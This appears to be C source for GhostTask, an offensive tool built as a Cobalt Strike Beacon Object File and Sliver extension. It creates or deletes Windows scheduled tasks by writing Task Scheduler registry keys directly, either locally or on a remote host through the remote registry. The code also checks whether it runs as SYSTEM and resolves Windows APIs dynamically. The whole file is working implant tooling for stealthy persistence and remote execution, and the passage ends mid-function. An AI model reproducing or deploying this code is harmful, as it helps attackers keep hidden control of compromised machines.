#include <windows.h>
#include "ghost_task.h"
#include "safety_checks.h"

#define GUIDSIZE 38
#define COPY_DATA(dest, src, size) \
    memcpy(dest, src, size);       \
    dest += size;

const char *DAYS[] = {"sunday", "monday", "tuesday", "wednesday", "thursday", "friday", "saturday"};
const char *SCHEDULETYPES[] = {"second", "daily", "weekly", "logon"};


#ifdef BOF
// malloc
WINBASEAPI void *__cdecl MSVCRT$malloc(size_t _Size);
// isspace
WINBASEAPI int __cdecl MSVCRT$isspace(int _C);
// _strlwr
WINBASEAPI char *__cdecl MSVCRT$_strlwr(char *_String);
// _strupr
WINBASEAPI char *__cdecl MSVCRT$_strupr(char *_String);

#define malloc MSVCRT$malloc
#define isspace MSVCRT$isspace
#define _strlwr MSVCRT$_strlwr
#define _strupr MSVCRT$_strupr
#define memcpy MSVCRT$memcpy
#define strlen MSVCRT$strlen
#define free MSVCRT$free
#define strcmp MSVCRT$strcmp
#define sprintf MSVCRT$sprintf
#define strtok MSVCRT$strtok
#define memset MSVCRT$memset

WINBASEAPI VOID WINAPI KERNEL32$GetLocalTime(LPSYSTEMTIME lpSystemTime);
#define GetLocalTime KERNEL32$GetLocalTime

WINBASEAPI WINBOOL WINAPI KERNEL32$SystemTimeToFileTime(CONST SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
#define SystemTimeToFileTime KERNEL32$SystemTimeToFileTime

//add GetCurrentThread
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentThread(VOID);
#define GetCurrentThread KERNEL32$GetCurrentThread

#define GetCurrentProcess KERNEL32$GetCurrentProcess
#define GetLastError KERNEL32$GetLastError


// Add MultiByteToWideChar
WINBASEAPI int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
#define MultiByteToWideChar KERNEL32$MultiByteToWideChar



// REF FUNCS
typedef LSTATUS WINAPI (*RegOpenKeyExA_t)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
typedef LSTATUS WINAPI (*RegQueryValueExA_t)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
typedef LSTATUS WINAPI (*RegCreateKeyExA_t)(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
typedef LSTATUS WINAPI (*RegSetValueExA_t)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
typedef LSTATUS WINAPI (*RegCloseKey_t)(HKEY hKey);
typedef LSTATUS WINAPI (*RegConnectRegistryA_t)(LPCSTR lpMachineName, HKEY hKey, PHKEY phkResult);
typedef LSTATUS WINAPI (*RegDeleteTreeA_t)(HKEY hKey, LPCSTR lpSubKey);
// add LookupAccountNameA
typedef BOOL WINAPI (*LookupAccountNameA_t)(LPCSTR lpSystemName, LPCSTR lpAccountName, PSID Sid, LPDWORD cbSid, LPSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse);
// add OpenProcessToken
typedef BOOL WINAPI (*OpenProcessToken_t)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// add OpenThreadToken
typedef BOOL WINAPI (*OpenThreadToken_t)(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
// add GetTokenInformation
typedef BOOL WINAPI (*GetTokenInformation_t)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// add AllocateAndInitializeSid
typedef BOOL WINAPI (*AllocateAndInitializeSid_t)(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD dwSubAuthority0, DWORD dwSubAuthority1, DWORD dwSubAuthority2, DWORD dwSubAuthority3, DWORD dwSubAuthority4, DWORD dwSubAuthority5, DWORD dwSubAuthority6, DWORD dwSubAuthority7, PSID *pSid);
// add EqualSid
typedef BOOL WINAPI (*EqualSid_t)(PSID pSid1, PSID pSid2);
// add FreeSid
typedef VOID WINAPI (*FreeSid_t)(PSID pSid);
// add ConvertStringSecurityDescriptorToSecurityDescriptorA
typedef BOOL WINAPI (*ConvertStringSecurityDescriptorToSecurityDescriptorA_t)(LPCSTR StringSecurityDescriptor, DWORD StringSDRevision, PSECURITY_DESCRIPTOR *SecurityDescriptor, PULONG SecurityDescriptorSize);

#define RegOpenKeyExA ((RegOpenKeyExA_t)DynamicLoad("ADVAPI32", "RegOpenKeyExA"))
#define RegQueryValueExA ((RegQueryValueExA_t)DynamicLoad("ADVAPI32", "RegQueryValueExA"))
#define RegCreateKeyExA ((RegCreateKeyExA_t)DynamicLoad("ADVAPI32", "RegCreateKeyExA"))
#define RegSetValueExA ((RegSetValueExA_t)DynamicLoad("ADVAPI32", "RegSetValueExA"))
#define RegCloseKey ((RegCloseKey_t)DynamicLoad("ADVAPI32", "RegCloseKey"))
#define RegConnectRegistryA ((RegConnectRegistryA_t)DynamicLoad("ADVAPI32", "RegConnectRegistryA"))
#define RegDeleteTreeA ((RegDeleteTreeA_t)DynamicLoad("ADVAPI32", "RegDeleteTreeA"))
#define LookupAccountNameA ((LookupAccountNameA_t)DynamicLoad("ADVAPI32", "LookupAccountNameA"))
#define OpenProcessToken ((OpenProcessToken_t)DynamicLoad("ADVAPI32", "OpenProcessToken"))
#define OpenThreadToken ((OpenThreadToken_t)DynamicLoad("ADVAPI32", "OpenThreadToken"))
#define GetTokenInformation ((GetTokenInformation_t)DynamicLoad("ADVAPI32", "GetTokenInformation"))
#define AllocateAndInitializeSid ((AllocateAndInitializeSid_t)DynamicLoad("ADVAPI32", "AllocateAndInitializeSid"))
#define EqualSid ((EqualSid_t)DynamicLoad("ADVAPI32", "EqualSid"))
#define FreeSid ((FreeSid_t)DynamicLoad("ADVAPI32", "FreeSid"))
#define ConvertStringSecurityDescriptorToSecurityDescriptorA ((ConvertStringSecurityDescriptorToSecurityDescriptorA_t)DynamicLoad("ADVAPI32", "ConvertStringSecurityDescriptorToSecurityDescriptorA"))

// RPCRT4 FUNCs
typedef RPC_STATUS RPC_ENTRY (*UuidCreate_t)(UUID *Uuid);
typedef RPC_STATUS RPC_ENTRY (*UuidToStringA_t)(UUID *Uuid, RPC_CSTR *StringUuid);
typedef RPC_STATUS RPC_ENTRY (*RpcStringFreeA_t)(RPC_CSTR *String);

#define UuidCreate ((UuidCreate_t)DynamicLoad("RPCRT4", "UuidCreate"))
#define UuidToStringA ((UuidToStringA_t)DynamicLoad("RPCRT4", "UuidToStringA"))
#define RpcStringFreeA ((RpcStringFreeA_t)DynamicLoad("RPCRT4", "RpcStringFreeA"))
#endif
char *my_strstr(char *haystack, char *needle)
{
    if (!*needle)
        return haystack;

    char *p1 = (char *)haystack, *p2 = (char *)needle;
    char *p1Adv = (char *)haystack;
    while (*++p2)
        p1Adv++;

    while (*p1Adv)
    {
        char *p1Begin = p1;
        p2 = (char *)needle;
        while (*p1 && *p2 && *p1 == *p2)
        {
            p1++;
            p2++;
        }
        if (!*p2)
            return p1Begin;

        p1 = p1Begin + 1;
        p1Adv++;
    }
    return NULL;
}

int my_atoi(const char *str)
{
    int res = 0;
    int sign = 1;
    int i = 0;

    // Skip whitespace characters
    while (isspace((unsigned char)str[i]))
    {
        i++;
    }

    // Check for optional sign
    if (str[i] == '-' || str[i] == '+')
    {
        sign = (str[i] == '-') ? -1 : 1;
        i++;
    }

    // Convert number
    while (isdigit((unsigned char)str[i]))
    {
        res = res * 10 + (str[i] - '0');
        i++;
    }

    return sign * res;
}

char *my_strrchr(const char *s, int c)
{
    char *last_occurrence = NULL;
    while (*s)
    {
        if (*s == c)
            last_occurrence = (char *)s;
        s++;
    }
    return last_occurrence;
}

void my_strncpy_s(char *dest, size_t destSize, const char *src, size_t count)
{
    size_t i;
    for (i = 0; i < count && i < destSize - 1 && src[i] != '\0'; i++)
    {
        dest[i] = src[i];
    }
    dest[i] = '\0';
}
#ifdef BOF
BOOL ParseArguments(datap *parser, Arguments *arguments)
{
    int arglen;
    char *computerName;
    char *computerNameL;
    char *operation;
    char *taskName;
    char *program;
    char *argument;
    char *userName;
    char *scheduleType;
    char *time = NULL;
    char *dayStr = NULL;
    char *day;
    int computerNameSize;
    arguments->dayBitmap = 0;

    arglen = BeaconDataInt(parser);

    // Parse computerName and operation from the datap structure
    computerName = BeaconDataExtract(parser, NULL);
    operation = BeaconDataExtract(parser, NULL);
    // BeaconPrintf(CALLBACK_OUTPUT, "%s", computerName);
    // BeaconPrintf(CALLBACK_OUTPUT, "%s", operation);
    //  Check if enough arguments are provided
    if (computerName == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "No computer name (e.g., localhost/remote server hostname) provided.");
        return FALSE;
    }
    else if (operation == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "No reg task operation (e.g., add/delete) provided.");
        return FALSE;
    }

    arguments->computerName = computerName;
    computerNameSize = strlen(computerName);
    computerNameL = (char *)malloc(computerNameSize + 1);
    memcpy(computerNameL, computerName, computerNameSize + 1);
    if (strcmp("localhost", _strlwr(computerNameL)) == 0)
        arguments->computerName = NULL;
    free(computerNameL);

    if (strcmp("add", _strlwr(operation)) == 0)
    {
        const char *missingArgs[] = {"task name", "program", "argument", "username for task execution", "schedule type"};
        for (int i = 3, j = 0; i < 8; i++, j++)
        {
            if (arglen == i)
            {
                BeaconPrintf(CALLBACK_ERROR, "No %s provided.", missingArgs[j]);
                return false;
            }
        }

        taskName = BeaconDataExtract(parser, NULL);
        program = BeaconDataExtract(parser, NULL);
        argument = BeaconDataExtract(parser, NULL);
        userName = BeaconDataExtract(parser, NULL);
        scheduleType = _strlwr(BeaconDataExtract(parser, NULL));

        arguments->taskName = taskName;
        arguments->taskOperation = TaskAddOperation;
        bool foundScheduleType = false;

        for (int i = 0; i < sizeof(SCHEDULETYPES) / sizeof(SCHEDULETYPES[0]); i++)
        {
            if (strcmp(scheduleType, SCHEDULETYPES[i]) == 0)
            {
                arguments->scheduleType = i;
                foundScheduleType = true;

                // For "second", "daily", and "weekly" we need an execution time
                if (i <= 2 && arglen == 8)
                {
                    BeaconPrintf(CALLBACK_ERROR, " Please provide scheduled task execution time (e.g., 22:15).");
                    return false;
                }

                if (i == 2)
                { // weekly
                    time = BeaconDataExtract(parser, NULL);
                    if (arglen == 9)
                    {
                        BeaconPrintf(CALLBACK_ERROR, " Please provide days (e.g., monday,friday) for weekly execution.");
                        return false;
                    }
                    dayStr = BeaconDataExtract(parser, NULL);
                    day = _strlwr(dayStr);
                    for (int j = 0; j < 7; j++)
                    {
                        if (my_strstr(day, (char *)DAYS[j]))
                            arguments->dayBitmap += (1 << j);
                    }
                }
                else if (i <= 2) // second or daily
                    time = BeaconDataExtract(parser, NULL);
            }
        }

        if (!foundScheduleType)
        {
            BeaconPrintf(CALLBACK_ERROR, "  Unknown schedule type '%s'.");
            return false;
        }

        // Handle time
        if (strcmp("second", scheduleType) == 0)
        {
            arguments->hour = 0;
            arguments->minute = 0;
            arguments->second = my_atoi(time);
        }
        else if (strcmp("daily", scheduleType) == 0 || strcmp("weekly", scheduleType) == 0)
        {
            char *token = strtok(time, ":");
            arguments->hour = my_atoi(token);
            token = strtok(NULL, ":");
            arguments->minute = my_atoi(token);
            if (arguments->hour > 23 || arguments->minute > 59)
            {
                BeaconPrintf(CALLBACK_ERROR, " Wrong time format (e.g., 15:30).");
                return false;
            }
        }

        arguments->program = program;
        arguments->argument = argument;
        arguments->userName = userName;
    }
    else if (strcmp("delete", operation) == 0)
    {
        if (arglen == 3)
        {
            BeaconPrintf(CALLBACK_ERROR, "No task name provided.");
            return FALSE;
        }
        taskName = BeaconDataExtract(parser, NULL);
        arguments->taskName = taskName;
        arguments->taskOperation = TaskDeleteOperation;
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "Unknown command '%s'.", operation);
        return FALSE;
    }
    return TRUE;
}

static BOOL IsEmptyArgument(const char *value)
{
    return value == NULL || value[0] == '\0';
}

static char LowerAscii(char value)
{
    if (value >= 'A' && value <= 'Z')
        return value + ('a' - 'A');
    return value;
}

static BOOL EqualsIgnoreCase(const char *value, const char *expected)
{
    int index = 0;
    if (value == NULL || expected == NULL)
        return FALSE;
    while (value[index] != '\0' && expected[index] != '\0')
    {
        if (LowerAscii(value[index]) != LowerAscii(expected[index]))
            return FALSE;
        index++;
    }
    return value[index] == '\0' && expected[index] == '\0';
}

static BOOL ExtractSliverString(datap *parser, const char *name, unsigned int maxContentLength, char **value)
{
    if (!GhostTaskExtractSliverField(parser, maxContentLength, value))
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid %s field in GhostTask argument buffer.", name);
        return FALSE;
    }
    return TRUE;
}

static BOOL ParsePositiveDecimal(const char *value, int *result)
{
    int parsed = 0;
    int digit = 0;
    if (IsEmptyArgument(value))
        return FALSE;
    while (*value != '\0')
    {
        if (*value < '0' || *value > '9')
            return FALSE;
        digit = *value - '0';
        if (parsed > (2147483647 - digit) / 10)
            return FALSE;
        parsed = parsed * 10 + digit;
        value++;
    }
    if (parsed <= 0)
        return FALSE;
    *result = parsed;
    return TRUE;
}

static BOOL ParseTime(const char *value, int *hour, int *minute)
{
    if (value == NULL || strlen(value) != 5 || value[2] != ':' ||
        value[0] < '0' || value[0] > '9' || value[1] < '0' || value[1] > '9' ||
        value[3] < '0' || value[3] > '9' || value[4] < '0' || value[4] > '9')
        return FALSE;
    *hour = (value[0] - '0') * 10 + (value[1] - '0');
    *minute = (value[3] - '0') * 10 + (value[4] - '0');
    return *hour <= 23 && *minute <= 59;
}

static BOOL ParseDays(const char *value, unsigned short *dayBitmap)
{
    int start = 0;
    int end = 0;
    int dayIndex = 0;
    int tokenLength = 0;
    BOOL matched = FALSE;

    *dayBitmap = 0;
    if (IsEmptyArgument(value))
        return FALSE;
    while (value[start] != '\0')
    {
        end = start;
        while (value[end] != '\0' && value[end] != ',')
            end++;
        tokenLength = end - start;
        if (tokenLength == 0)
            return FALSE;

        matched = FALSE;
        for (dayIndex = 0; dayIndex < 7; dayIndex++)
        {
            if (strlen(DAYS[dayIndex]) == tokenLength)
            {
                int character = 0;
                matched = TRUE;
                for (character = 0; character < tokenLength; character++)
                {
                    if (LowerAscii(value[start + character]) != DAYS[dayIndex][character])
                    {
                        matched = FALSE;
                        break;
                    }
                }
                if (matched)
                {
                    *dayBitmap |= (1 << dayIndex);
                    break;
                }
            }
        }
        if (!matched)
            return FALSE;
        if (value[end] == '\0')
            break;
        start = end + 1;
        if (value[start] == '\0')
            return FALSE;
    }
    return *dayBitmap != 0;
}

// Sliver packs manifest arguments in declaration order and cannot prepend the
// variable argument count used by the CNA. Parse a fixed nine-string layout so
// every operation has one deterministic wire format:
// computer, operation, task, program, argument, user, schedule, time, day.
BOOL ParseSliverArguments(datap *parser, Arguments *arguments)
{
    char *computerName = NULL;
    char *operation = NULL;
    char *taskName = NULL;
    char *program = NULL;
    char *argument = NULL;
    char *userName = NULL;
    char *scheduleType = NULL;
    char *time = NULL;
    char *day = NULL;

    memset(arguments, 0, sizeof(*arguments));
    if (!ExtractSliverString(parser, "computer-name", 255, &computerName) ||
        !ExtractSliverString(parser, "operation", 255, &operation) ||
        !ExtractSliverString(parser, "task-name", 190, &taskName) ||
        !ExtractSliverString(parser, "program", 255, &program) ||
        !ExtractSliverString(parser, "program-arguments", 255, &argument) ||
        !ExtractSliverString(parser, "username", 255, &userName) ||
        !ExtractSliverString(parser, "schedule-type", 255, &scheduleType) ||
        !ExtractSliverString(parser, "time", 255, &time) ||
        !ExtractSliverString(parser, "days", 255, &day) ||
        !GhostTaskSliverBufferConsumed(parser))
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid or trailing GhostTask argument data.");
        return FALSE;
    }

    if (IsEmptyArgument(computerName) || IsEmptyArgument(operation) || IsEmptyArgument(taskName))
    {
        BeaconPrintf(CALLBACK_ERROR, "Computer name, operation, and task name are required.");
        return FALSE;
    }
    arguments->computerName = EqualsIgnoreCase(computerName, "localhost") ? NULL : computerName;
    arguments->taskName = taskName;

    if (EqualsIgnoreCase(operation, "delete"))
    {
        if (!IsEmptyArgument(program) || !IsEmptyArgument(argument) ||
            !IsEmptyArgument(userName) || !IsEmptyArgument(scheduleType) ||
            !IsEmptyArgument(time) || !IsEmptyArgument(day))
        {
            BeaconPrintf(CALLBACK_ERROR, "Delete does not accept add-only arguments.");
            return FALSE;
        }
        arguments->taskOperation = TaskDeleteOperation;
        return TRUE;
    }
    if (!EqualsIgnoreCase(operation, "add"))
    {
        BeaconPrintf(CALLBACK_ERROR, "Unknown task operation '%s'.", operation);
        return FALSE;
    }
    if (IsEmptyArgument(program) || IsEmptyArgument(userName) || IsEmptyArgument(scheduleType))
    {
        BeaconPrintf(CALLBACK_ERROR, "Add requires program, username, and schedule type.");
        return FALSE;
    }

    arguments->taskOperation = TaskAddOperation;
    arguments->program = program;
    arguments->argument = argument;
    arguments->userName = userName;

    if (EqualsIgnoreCase(scheduleType, "second"))
    {
        if (!ParsePositiveDecimal(time, &arguments->second) || !IsEmptyArgument(day))
        {
            BeaconPrintf(CALLBACK_ERROR, "Second schedule requires positive decimal time and no days.");
            return FALSE;
        }
        arguments->scheduleType = 0;
    }
    else if (EqualsIgnoreCase(scheduleType, "daily"))
    {
        if (!ParseTime(time, &arguments->hour, &arguments->minute) || !IsEmptyArgument(day))
        {
            BeaconPrintf(CALLBACK_ERROR, "Daily schedule requires HH:MM time and no days.");
            return FALSE;
        }
        arguments->scheduleType = 1;
    }
    else if (EqualsIgnoreCase(scheduleType, "weekly"))
    {
        if (!ParseTime(time, &arguments->hour, &arguments->minute) ||
            !ParseDays(day, &arguments->dayBitmap))
        {
            BeaconPrintf(CALLBACK_ERROR, "Weekly schedule requires HH:MM time and exact comma-separated weekdays.");
            return FALSE;
        }
        arguments->scheduleType = 2;
    }
    else if (EqualsIgnoreCase(scheduleType, "logon"))
    {
        if (!IsEmptyArgument(time) || !IsEmptyArgument(day))
        {
            BeaconPrintf(CALLBACK_ERROR, "Logon schedule does not accept time or days.");
            return FALSE;
        }
        arguments->scheduleType = 3;
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "Unknown schedule type '%s'.", scheduleType);
        return FALSE;
    }

    return TRUE;
}
#else
void printHelp()
{
    printf("Usage: GhostTask.exe <hostname/localhost> <operation> <taskname> <program> <argument> <username> <scheduletype> <time/second> <day>\n");
    printf("- hostname/localhost: Remote computer name or \"localhost\".\n");
    printf("- operation: add/delete\n");
    printf("  - add: Create or modify a scheduled task using only registry keys. Requires restarting the \"Schedule\" service to load the task definition.\n");
    printf("  - delete: Delete a scheduled task. Requires restarting the \"Schedule\" service to offload the task.\n");
    printf("- taskname: Name of the scheduled task.\n");
    printf("- program: Program to be executed.\n");
    printf("- argument: Arguments for the program.\n");
    printf("- username: User account under which the scheduled task will run.\n");
    printf("- scheduletype: Supported triggers: second, daily, weekly, and logon.\n");
    printf("- time/second (applicable for 'second', 'daily', and 'weekly' triggers):\n");
    printf("  - For 'second' trigger: Specify the frequency in seconds for task execution.\n");
    printf("  - For 'daily' and 'weekly' triggers: Specify the exact time (e.g., 22:30) for task execution.\n");
    printf("- day (applicable for 'weekly' trigger): Days to execute the scheduled task (e.g., monday, thursday).\n");
}
bool ParseArguments(char **args, int arglen, Arguments *arguments)
{
    char *computerName;
    char *computerNameL;
    char *operation;
    char *taskName;
    char *program;
    char *argument;
    char *userName;
    char *scheduleType;
    char *time;
    char *day;
    int computerNameSize;
    arguments->dayBitmap = 0;
    if (arglen == 1)
    {
        printf("[-] No computer name (e.g., localhost/remote server hostname) provided.\n");
        return false;
    }
    else if (arglen == 2)
    {
        printf("[-] No reg task operation (e.g., add/delete) provided.\n");
        return false;
    }
    computerName = args[1];
    operation = args[2];
    arguments->computerName = computerName;
    computerNameSize = strlen(computerName);
    computerNameL = (char *)malloc(computerNameSize + 1);
    memcpy(computerNameL, computerName, computerNameSize + 1);
    if (strcmp("localhost", _strlwr(computerNameL)) == 0)
        arguments->computerName = NULL;
    free(computerNameL);
    if (strcmp("add", _strlwr(operation)) == 0)
    {
        const char *missingArgs[] = {"task name", "program", "argument", "username for task execution", "schedule type"};
        for (int i = 3, j = 0; i < 8; i++, j++)
        {
            if (arglen == i)
            {
                printf("[-] No %s provided.\n", missingArgs[j]);
                return false;
            }
        }
        taskName = args[3];
        program = args[4];
        argument = args[5];
        userName = args[6];
        scheduleType = _strlwr(args[7]);

        arguments->taskName = taskName;
        arguments->taskOperation = TaskAddOperation;
        bool foundScheduleType = false;

        for (int i = 0; i < sizeof(SCHEDULETYPES) / sizeof(SCHEDULETYPES[0]); i++)
        {
            if (strcmp(scheduleType, SCHEDULETYPES[i]) == 0)
            {
                arguments->scheduleType = i;
                foundScheduleType = true;

                // For "second", "daily", and "weekly" we need an execution time
                if (i <= 2 && arglen == 8)
                {
                    printf("[-] Please provide scheduled task execution time (e.g., 22:15).\n");
                    return false;
                }

                if (i == 2)
                { // weekly
                    time = args[8];
                    if (arglen == 9)
                    {
                        printf("[-] Please provide days (e.g., monday,friday) for weekly execution.\n");
                        return false;
                    }
                    day = _strlwr(args[9]);
                    for (int j = 0; j < 7; j++)
                    {
                        if (strstr(day, DAYS[j]))
                            arguments->dayBitmap += (1 << j);
                    }
                }
                else if (i <= 2) // second or daily
                    time = args[8];
            }
        }

        if (!foundScheduleType)
        {
            printf("[-] Unknown schedule type '%s'.\n", scheduleType);
            return false;
        }

        // Handle time
        if (strcmp("second", scheduleType) == 0)
        {
            arguments->hour = 0;
            arguments->minute = 0;
            arguments->second = atoi(time);
        }
        else if (strcmp("daily", scheduleType) == 0 || strcmp("weekly", scheduleType) == 0)
        {
            char *token = strtok(time, ":");
            arguments->hour = atoi(token);
            token = strtok(NULL, ":");
            arguments->minute = atoi(token);
            if (arguments->hour > 23 || arguments->minute > 59)
            {
                printf("[-] Wrong time format (e.g., 15:30).");
                return false;
            }
        }

        arguments->program = program;
        arguments->argument = argument;
        arguments->userName = userName;
    }
    else if (strcmp("delete", operation) == 0)
    {
        if (arglen == 3)
        {
            printf("[-] No task name provided.\n");
            return false;
        }

        taskName = args[3];
        arguments->taskName = taskName;
        arguments->taskOperation = TaskDeleteOperation;
    }
    else
    {
        printf("[-] Unknown command '%s'.\n", operation);
        return false;
    }
    return true;
}
#endif

BOOL CheckSystem()
{
    HANDLE hToken = NULL;
    UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG cbTokenUser = 0;
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    PSID pSystemSid = NULL;
    BOOL bSystem = FALSE;

    // Get thread token, if failed then try process token
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken))
    {
        if (hToken == NULL && GetLastError() == ERROR_NO_TOKEN)
        {
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            {
                BeaconPrintf(CALLBACK_ERROR, "Error calling OpenProcessToken. Error code:0x%x", GetLastError());
                goto check_system_exit;
            }
        }
    }
    if (hToken == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "No token found. Error code:0x%x", GetLastError());
        goto check_system_exit;
    }

    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error calling GetTokenInformation. Error code:0x%x", GetLastError());
        goto check_system_exit;
    }

    if (!AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error calling AllocateAndInitializeSid. Error code:0x%x", GetLastError());
        goto check_system_exit;
    }

    bSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);

check_system_exit:
    if (pSystemSid != NULL)
        FreeSid(pSystemSid);
    if (hToken != NULL)
        KERNEL32$CloseHandle(hToken);
    return bSystem;
}

// Return a handle to the specified registry key, return error code if failure
REG_ERROR_CODE OpenKeyHandle(HKEY *hKey, LPCSTR computerName, ACCESS_MASK desiredAccess, LPCSTR keyName)
{
    LSTATUS lret;
    REGSAM archType = KEY_WOW64_64KEY;
    const char *hiveRootString = "HKLM";
    const char *computerString = computerName;
    const char *computerNameSeparator = "\\";
    if (computerName == NULL)
        computerNameSeparator = computerString = "";

    if (computerName != NULL)
    {
        HKEY hRemoteRoot = NULL;
        lret = RegConnectRegistryA(computerName, HKEY_LOCAL_MACHINE, &hRemoteRoot);
        if (lret != ERROR_SUCCESS || hRemoteRoot == NULL)
        {
            // printf("[-] Failed to connect to '%s%s%s' [error %d].\n", computerString, computerNameSeparator, hiveRootString, lret);
            BeaconPrintf(CALLBACK_ERROR, "Failed to connect to '%s%s%s' [error %d].\n", computerString, computerNameSeparator, hiveRootString, lret);
            return SERVER_INACCESSIBLE;
        }
        lret = RegOpenKeyExA(hRemoteRoot, keyName, 0, archType | desiredAccess, hKey);
        RegCloseKey(hRemoteRoot);
        if (lret != ERROR_SUCCESS)
            return OPEN_KEY_FAIL;
    }
    else
    {
        lret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyName, 0, archType | desiredAccess, hKey);
        if (lret != ERROR_SUCCESS)
            return OPEN_KEY_FAIL;
    }

    return REG_SUCCESS;
}

TASK_GUID_RESULT GetExistingTaskGuid(LPCSTR computerName, LPCSTR taskName, char **guid)
{
    DWORD dwRet = 0;
    DWORD type = 0;
    DWORD size = 0;
    char *treePath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\";
    int treePathSize = strlen(treePath);
    char *treeKey = NULL;
    HKEY key = NULL;
    char *valueData = NULL;

    if (guid == NULL)
        return TaskGuidInvalid;
    *guid = NULL;

    if (!GhostTaskHasSafeTaskName(taskName))
    {
        BeaconPrintf(CALLBACK_ERROR, "Task name must be a safe 1-190 byte registry path.");
        return TaskGuidInvalid;
    }
    treeKey = (char *)malloc(treePathSize + strlen(taskName) + 1);
    if (treeKey == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
        return TaskGuidInvalid;
    }
    sprintf(treeKey, "%s%s", treePath, taskName);

    REG_ERROR_CODE regRetCode = OpenKeyHandle(&key, computerName, KEY_READ, treeKey);
    free(treeKey);
    if (regRetCode == OPEN_KEY_FAIL)
        return TaskGuidAbsent;
    if (regRetCode != REG_SUCCESS)
        return TaskGuidInvalid;

    dwRet = RegQueryValueExA(key, "Id", NULL, &type, NULL, &size);
    if (dwRet != ERROR_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error calling RegQueryValueExA. Error code:0x%x\n", dwRet);
        goto exit;
    }

    if (type != REG_SZ || size != GUIDSIZE + 1)
    {
        BeaconPrintf(CALLBACK_ERROR, "Task Id must be an exact NUL-terminated GUID string.");
        goto exit;
    }

    valueData = (char *)malloc(size);
    if (!valueData)
        goto exit;

    dwRet = RegQueryValueExA(key, "Id", NULL, &type, (LPBYTE)valueData, &size);
    if (dwRet != ERROR_SUCCESS || type != REG_SZ || !GhostTaskIsValidGuid(valueData, size))
    {
        BeaconPrintf(CALLBACK_ERROR, "Task Id is not a valid GUID string. Error code:0x%x\n", dwRet);
        free(valueData);
        valueData = NULL;
    }

exit:
    if (key)
        RegCloseKey(key);
    if (valueData == NULL)
        return TaskGuidInvalid;
    *guid = valueData;
    return TaskGuidFound;
}
/* ---------------------------------------------------------------------------Add func start--------------------------------------------------------------------------------------------------------------------------------*/

char *GetProductName(LPCSTR computerName)
{
    DWORD dwRet = 0;
    DWORD type = 0;
    DWORD size = 0;
    char *path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\";
    HKEY key = NULL;
    char *valueData = NULL;

    REG_ERROR_CODE regRetCode = OpenKeyHandle(&key, computerName, KEY_READ, path);
    if (regRetCode != REG_SUCCESS)
        return NULL;

    dwRet = RegQueryValueExA(key, "ProductName", NULL, &type, NULL, &size);
    if (dwRet != ERROR_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error calling RegQueryValueExA. Error code:0x%x\n", dwRet);
        goto exit;
    }

    if ((type != REG_SZ && type != REG_EXPAND_SZ) || size == 0 || size > 4096)
    {
        BeaconPrintf(CALLBACK_ERROR, "ProductName has an invalid registry type or size.");
        goto exit;
    }

    valueData = (char *)malloc(size + 1);
    if (!valueData)
        goto exit;
    memset(valueData, 0, size + 1);

    dwRet = RegQueryValueExA(key, "ProductName", NULL, &type, (LPBYTE)valueData, &size);
    if (dwRet != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ) || size > 4096)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error calling RegQueryValueExA. Error code:0x%x\n", dwRet);
        free(valueData);
        valueData = NULL;
    }
    else
    {
        valueData[size] = '\0';
    }

exit:
    if (key)
        RegCloseKey(key);
    return valueData;
}

REG_ERROR_CODE AddKey(LPCSTR computerName, LPCSTR keyName)
{
    const char *hiveRootString = "HKLM";
    const char *rootSeparator = (strlen(keyName) == 0) ? "" : "\\";
    const char *computerString = computerName == NULL ? "" : computerName;
    const char *computerNameSeparator = computerName == NULL ? "" : "\\";

    HKEY hHiveRoot = NULL;
